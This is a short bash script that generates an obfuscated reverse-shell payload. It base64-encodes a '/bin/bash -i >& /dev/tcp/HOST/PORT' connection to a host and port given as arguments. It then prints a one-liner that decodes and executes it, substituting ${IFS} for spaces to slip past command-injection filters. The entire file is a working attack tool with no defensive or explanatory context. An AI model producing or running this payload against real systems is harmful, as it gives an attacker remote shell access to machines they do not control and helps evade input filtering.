#!/bin/bash

SHELLC=`echo "/bin/bash -i >& /dev/tcp/$1/$2 0>&1" | base64`
echo "echo\${IFS}\"${SHELLC}\"|base64\${IFS}-d|bash;"
